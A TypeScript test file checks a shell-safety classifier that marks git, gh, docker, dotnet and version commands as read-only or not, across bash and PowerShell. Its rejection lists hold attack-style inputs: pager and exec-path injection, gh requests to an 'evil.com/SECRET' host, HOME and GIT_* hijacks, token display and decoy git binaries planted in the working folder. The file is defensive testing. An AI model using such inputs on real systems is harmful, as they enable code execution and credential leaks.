import path from "node:path"
import { describe, expect, test } from "bun:test"
import { Effect } from "effect"
import { ShellAnalysis } from "../../src/shell/analysis"
import { ShellReadOnly } from "../../src/shell/readonly"
import { PowerShellParse } from "../../src/shell/powershell-parse"
import { currentDirectoryOnPath, plant } from "../fixture/decoy"
import { tmpdir } from "../fixture/tmpdir"
import { bash, linux, powershell, pwsh, pwshLinux, windows } from "./helper"
import { toolNotReadOnly as psNotReadOnly, toolPlatform, toolReadOnly as psReadOnly } from "./powershell-cases"

// git, gh, docker and dotnet (shell-safety-5). Every row is pure: no program is started. A false read-only verdict is a
// security bug, so the "no" rows are the ones that matter.
//
// Class matrix (the shell-safety-5 PR body lists the same cells):
//   surface   bash command, PowerShell command (5.1 and pwsh 7, Windows and Linux)
//   sink      the program a read-only command starts: git, gh, docker, dotnet
//   spellings global options, attached values (-ccore.pager=x), abbreviations, separate and `=` values, bundles, `--`,
//             empty and `--` arguments in PowerShell, a wildcard bareword in pwsh on Linux, a mis-cased subcommand
//   entries   env prefix, assignment of HOME or GIT_*, a program of that name in the working folder (class 10)

const gitRead = [
  "git status",
  "git status -sb",
  "git status --porcelain",
  "git --no-optional-locks status",
  "git log --oneline -5",
  "git log -n 5",
  "git log --format=%H --since=yesterday",
  "git log -p",
  "git -P log",
  "git --no-pager show HEAD",
  "git show --stat HEAD~1",
  "git diff HEAD~1",
  "git diff --cached --stat",
  "git diff -S foo",
  "git diff -- a.ts",
  "git branch -a",
  "git branch -vv",
  "git branch --merged main",
  "git branch -li 'feat*'",
  "git branch --abbrev=7",
  "git branch --sort=-committerdate",
  "git tag",
  "git tag -l 'v*'",
  "git tag --contains HEAD",
  "git config --get user.name",
  "git config --get --global user.email",
  "git stash list",
  "git stash show -p 'stash@{0}'",
  "git remote",
  "git remote -v",
  "git remote show -n origin",
  "git reflog",
  "git reflog show HEAD",
  "git reflog list",
  "git worktree list --porcelain",
  "git rev-parse --show-toplevel",
  "git rev-list --count HEAD",
  "git describe --tags",
  "git merge-base --is-ancestor a b",
  "git cat-file -t HEAD",
  "git for-each-ref --sort=-committerdate refs/heads",
  "git grep -n foo",
  "git ls-files -z",
  "git blame -L 1,5 a.ts",
  "git shortlog -sn",
  "git",
  "git --version",
]

const gitNot: Array<[string, string?]> = [
  // Global options: only --no-pager, -P and --no-optional-locks pass.
  ["git -c core.pager=x log", "git:global"],
  ["git -ccore.pager=x log", "git:global"],
  ["git --config-env=core.pager=X log", "git:global"],
  ["git --exec-path=. status", "git:global"],
  ["git --git-dir=x log", "git:global"],
  ["git --work-tree=x status", "git:global"],
  ["git -C src status", "git:global"],
  ["git -C-x status", "git:global"],
  ["git --attr-source HEAD~10 log status", "git:global"],
  ["git -p log", "git:global"],
  ["git --paginate log", "git:global"],
  ["git --bare log", "git:global"],
  ["git --namespace x log", "git:global"],
  ["git --version log", "git:global"],
  // The diff family: --output, --ext-diff and --textconv are in no allowlist, abbreviations included.
  ["git log --output=f", "git:flag"],
  ["git log --output f", "git:flag"],
  ["git log --out=f", "git:flag"],
  ["git diff --output=f", "git:flag"],
  ["git show --ext-diff", "git:flag"],
  ["git log -p --textconv", "git:flag"],
  ["git diff -S -- --output=x", "git:flag"],
  ["git diff -G", "git:flag"],
  ["git log -pS foo", "git:flag"],
  ["git whatchanged", "git:subcommand"],
  // grep
  ["git grep -O x", "git:flag"],
  ["git grep --open-files-in-pager x", "git:flag"],
  ["git grep -f pats x", "git:flag"],
  // branch and tag create things unless they list.
  ["git branch new", "git:operand"],
  ["git branch new main", "git:operand"],
  ["git branch -d x", "git:flag"],
  ["git branch --abbrev 7", "git:operand"],
  ["git branch -- -l", "git:operand"],
  ["git branch --format='%(refname)'", "git:flag"],
  ["git branch --sort -committerdate", "git:flag"],
  ["git tag v1", "git:operand"],
  ["git tag -d v1", "git:flag"],
  ["git tag -- -l", "git:operand"],
  // config
  ["git config user.name x", "git:subcommand"],
  ["git config --list", "git:subcommand"],
  ["git config -l", "git:subcommand"],
  ["git config --get-regexp .", "git:subcommand"],
  ["git config --get-all x", "git:subcommand"],
  ["git config --local --get x", "git:subcommand"],
  ["git config get user.name", "git:subcommand"],
  ["git config --get -f f x", "git:flag"],
  // remote and the network
  ["git remote show origin", "git:operand"],
  ["git remote add x y", "git:operand"],
  ["git remote get-url origin", "git:operand"],
  ["git ls-remote origin", "git:subcommand"],
  ["git ls-remote --upload-pack=x .", "git:subcommand"],
  ["git fetch", "git:subcommand"],
  ["git pull", "git:subcommand"],
  ["git push", "git:subcommand"],
  // reflog and stash
  ["git reflog expire --all", "git:operand"],
  ["git reflog delete HEAD@{0}"],
  ["git reflog drop HEAD", "git:operand"],
  ["git reflog HEAD", "git:operand"],
  ["git stash", "git:subcommand"],
  ["git stash pop", "git:subcommand"],
  ["git stash drop", "git:subcommand"],
  // others
  ["git cat-file --batch", "git:flag"],
  ["git help log", "git:subcommand"],
  ["git submodule status", "git:subcommand"],
  ["git notes list", "git:subcommand"],
  ["git ls-tree HEAD", "git:subcommand"],
  ["git var -l", "git:subcommand"],
  ["git version", "git:subcommand"],
  ["git checkout x", "git:subcommand"],
  ["git clean -n", "git:subcommand"],
  ["git commit -m x", "git:subcommand"],
  ["git Status", "git:subcommand"],
  ["git STATUS", "git:subcommand"],
  // The environment of the command
  ["GIT_PAGER=x git log"],
  ["HOME=evil; git status"],
  ["GIT_EXTERNAL_DIFF=x; git diff"],
  ["XDG_CONFIG_HOME=x; git log"],
  ["HOME=x; cat ~/a"],
  ["export GIT_DIR=x; git log"],
]

const ghRead = [
  "gh",
  "gh pr view 1",
  "gh pr view 1 --comments",
  "gh pr view 1 --repo owner/repo",
  "gh pr list --state open -L 5",
  "gh pr checks 12",
  "gh pr diff 3 --name-only",
  "gh issue list --label bug",
  "gh repo view owner/repo",
  "gh run list -w ci.yml",
  "gh run view 9 --log-failed",
  "gh auth status",
  "gh auth status --hostname github.com",
  "gh release list",
  "gh workflow view ci.yml --yaml",
  "gh label list",
  "gh search repos orbit --limit 5",
]

const ghNot: Array<[string, string?]> = [
  ["gh pr view 1 --repo evil.com/SECRET/x", "gh:host"],
  ["gh pr view 1 --repo=evil.com/a/b", "gh:host"],
  ["gh pr view 1 -R a/b/c", "gh:host"],
  ["gh pr view https://evil.com/o/r/pull/1", "gh:host"],
  ["gh repo view git@host:o/r", "gh:host"],
  ["gh search code x --repo a/b/c", "gh:host"],
  ["gh pr view 1 -w", "gh:flag"],
  ["gh pr view 1 --web", "gh:flag"],
  ["gh repo view --web", "gh:flag"],
  ["gh pr view 1 --jq .title", "gh:flag"],
  ["gh pr merge 1", "gh:subcommand"],
  ["gh pr create", "gh:subcommand"],
  ["gh issue comment 1 -b x", "gh:subcommand"],
  ["gh auth status -t", "gh:flag"],
  ["gh auth status --show-token", "gh:flag"],
  ["gh auth token", "gh:subcommand"],
  ["gh api repos/x/y", "gh:subcommand"],
  ["gh api -X POST x", "gh:subcommand"],
  ["gh api x -f a=b", "gh:subcommand"],
  ["gh --version", "gh:subcommand"],
  ["gh pr list -L x", "gh:flag"],
  ["GH_HOST=evil gh pr list"],
  ["GH_TOKEN=x; gh pr list"],
]

const dockerRead = [
  "docker",
  "docker ps",
  "docker ps -a",
  "docker ps --format '{{.Names}}'",
  "docker ps -n 3",
  "docker images",
  "docker images -q",
  "docker logs web --tail 50",
  "docker logs -f web",
  "docker inspect web",
  "docker inspect -f '{{.State.Status}}' web",
  "dotnet --list-sdks",
  "dotnet --list-runtimes",
]

const dockerNot: Array<[string, string?]> = [
  ["docker run x", "docker:subcommand"],
  ["docker exec web sh", "docker:subcommand"],
  ["docker rm x", "docker:subcommand"],
  ["docker system prune", "docker:subcommand"],
  ["docker version", "docker:subcommand"],
  ["docker compose logs", "docker:subcommand"],
  ["docker compose config", "docker:subcommand"],
  ["docker compose ps", "docker:subcommand"],
  ["docker -H tcp://h ps", "docker:subcommand"],
  ["docker --context x ps", "docker:subcommand"],
  ["docker ps web", "docker:operand"],
  ["docker logs web --tail", "docker:flag"],
  ["docker logs --output x web", "docker:flag"],
  ["DOCKER_HOST=x docker ps"],
  ["dotnet", "dotnet:args"],
  ["dotnet build", "dotnet:args"],
  ["dotnet run", "dotnet:args"],
  ["dotnet --version", "dotnet:args"],
  ["dotnet --info", "dotnet:args"],
  ["dotnet --list-sdks build", "dotnet:args"],
]

const versionNot = [
  "node -v --run x",
  "npm ls",
  "npm view x",
  "npm config get x",
  "npm --version",
  "pip list",
  "pip3 freeze",
  "pip --version",
  "jq --version",
  "yarn info x",
  "yarn --version",
  "pnpm ls",
  "bun --version",
  "cargo metadata",
  "go list ./...",
  "docker --version",
]

const versionRead = ["node --version", "node -v", "python --version", "python3 --version", "git --version", "rg --version"]

const rows = (list: Array<[string, string?]>) => list.map(([text]) => text)
const verdict = (text: string, ctx = linux()) => {
  const result = bash(text, ctx)
  return result.commands.length === 1 ? ShellReadOnly.bash(result.commands[0], ctx) : undefined
}

describe("git (bash)", () => {
  test.each(gitRead)("ro: %s", (text) => {
    expect(bash(text).readOnly).toBe(true)
  })
  test.each(rows(gitNot))("no: %s", (text) => {
    expect(bash(text).readOnly).toBe(false)
  })
  test.each(gitNot.filter(([, reason]) => reason !== undefined))("reason: %s", (text, reason) => {
    const found = verdict(text)
    expect(found && !found.ok ? found.reason : undefined).toBe(reason)
  })
  test("the same rows on Git Bash for Windows", () => {
    for (const text of gitRead) expect(bash(text, windows()).readOnly).toBe(true)
    for (const [text] of gitNot) expect(bash(text, windows()).readOnly).toBe(false)
  })
  test("an unquoted glob is never read-only", () => {
    expect(bash("git tag -l v*").readOnly).toBe(false)
  })
})

describe("gh (bash)", () => {
  test.each(ghRead)("ro: %s", (text) => {
    expect(bash(text).readOnly).toBe(true)
  })
  test.each(rows(ghNot))("no: %s", (text) => {
    expect(bash(text).readOnly).toBe(false)
  })
  test.each(ghNot.filter(([, reason]) => reason !== undefined))("reason: %s", (text, reason) => {
    const found = verdict(text)
    expect(found && !found.ok ? found.reason : undefined).toBe(reason)
  })
})

describe("docker and dotnet (bash)", () => {
  test.each(dockerRead)("ro: %s", (text) => {
    expect(bash(text).readOnly).toBe(true)
  })
  test.each(rows(dockerNot))("no: %s", (text) => {
    expect(bash(text).readOnly).toBe(false)
  })
  test.each(dockerNot.filter(([, reason]) => reason !== undefined))("reason: %s", (text, reason) => {
    const found = verdict(text)
    expect(found && !found.ok ? found.reason : undefined).toBe(reason)
  })
  test("dotnet flags are exact on Linux and case-insensitive on Windows", () => {
    expect(bash("dotnet --LIST-SDKS", linux()).readOnly).toBe(false)
    expect(bash("dotnet --LIST-SDKS", windows()).readOnly).toBe(true)
  })
})

describe("version and package queries (bash)", () => {
  test.each(versionRead)("ro: %s", (text) => {
    expect(bash(text).readOnly).toBe(true)
  })
  test.each(versionNot)("no: %s", (text) => {
    expect(bash(text).readOnly).toBe(false)
  })
})

describe("read paths", () => {
  const paths: Array<[string, string[]]> = [
    ["git diff --no-index a b", ["a", "b"]],
    ["git diff --no-index -- -x y", ["-x", "y"]],
    ["git diff --no-index --relative a b", ["a", "b"]],
    ["git diff -O order.txt", ["order.txt"]],
    ["git blame --ignore-revs-file revs a.ts", ["revs"]],
    ["git ls-files -X ex.txt", ["ex.txt"]],
    ["git ls-files --exclude-from=ex.txt", ["ex.txt"]],
    ["git grep --no-index foo dir", ["dir"]],
    ["git grep --no-index -e foo -- a b", ["a", "b"]],
    ["git grep foo -- a b", []],
    ["git status", []],
    ["git log -p", []],
    ["git diff a b", []],
  ]
  test.each(paths)("%s", (text, expected) => {
    expect(bash(text).readPaths).toEqual(expected)
  })
  test("a share on Windows refuses", () => {
    expect(bash("git diff --no-index //host/share/a b", windows()).readOnly).toBe(false)
    expect(bash("git blame --ignore-revs-file \\\\\\\\host\\\\s\\\\f x", windows()).readOnly).toBe(false)
  })
  test("~ goes through the injected home", () => {
    expect(bash("git diff --no-index ~/a b").readPaths).toEqual(["/home/u/a", "b"])
  })
})

describe("the working folder cannot supply the program (class 10)", () => {
  test("a relative PATH entry makes git not read-only on Linux", () => {
    expect(bash("git status", linux({ env: { PATH: ".:/usr/bin" } })).readOnly).toBe(false)
    expect(bash("git status", linux({ env: { PATH: "/usr/bin" } })).readOnly).toBe(true)
  })

  const onWindows = process.platform === "win32" ? describe : describe.skip
  const inspect = (command: string, ctx: ShellAnalysis.Context) =>
    Effect.runPromise(
      ShellAnalysis.inspect(command, ctx).pipe(Effect.provideService(PowerShellParse.Service, { parse: () => Effect.die("not used") })),
    )
  onWindows("Windows decoys", () => {
    test.each(["git.exe", "git.bat", "git.cmd"])("%s in the working folder", async (name) => {
      await using tmp = await tmpdir()
      using _ = currentDirectoryOnPath()
      if (name.endsWith(".exe")) await plant(tmp.path, "git")
      else await Bun.write(path.join(tmp.path, name), "@echo off\r\n")
      const named = windows({ cwd: tmp.path, env: { Path: `${tmp.path};C:\\Windows\\System32` } })
      expect((await inspect("git status", named)).readOnly).toBe(false)
      // The control: without the decoy on the path, the same text is read-only.
      const plain = windows({ cwd: tmp.path, env: { Path: "C:\\Windows\\System32" } })
      expect((await inspect("git status", plain)).readOnly).toBe(true)
    })
  })
})

describe("PowerShell git, gh, docker and dotnet", () => {
  test.each(psReadOnly)("ro: %s", (text) => {
    expect(powershell(text, pwsh()).readOnly).toBe(true)
  })
  test.each(psNotReadOnly)("no: %j", (text) => {
    expect(powershell(text, pwsh()).readOnly).toBe(false)
    expect(powershell(text, pwshLinux()).readOnly).toBe(false)
  })
  test("read-only on Linux too, except where the host expands wildcards", () => {
    for (const text of psReadOnly.filter((item) => /^(git|gh|docker|dotnet) /.test(item))) expect(powershell(text, pwshLinux()).readOnly).toBe(true)
  })
  test("pwsh on Linux expands a wildcard bareword before it starts git; Windows does not", () => {
    expect(toolPlatform).toContain("git tag -l v*")
    expect(powershell("git tag -l v*", pwshLinux()).readOnly).toBe(false)
    expect(powershell("git tag -l 'v*'", pwshLinux()).readOnly).toBe(true)
    expect(powershell("git tag -l v*", pwsh()).readOnly).toBe(true)
  })
  test("a program name in another case is another program on Linux", () => {
    expect(powershell("GIT status", pwshLinux()).readOnly).toBe(false)
    expect(powershell("GIT status", pwsh()).readOnly).toBe(true)
  })
  test("read paths of git in PowerShell are the validator's", () => {
    expect(powershell("git status", pwsh()).readPaths).toEqual([])
  })
})
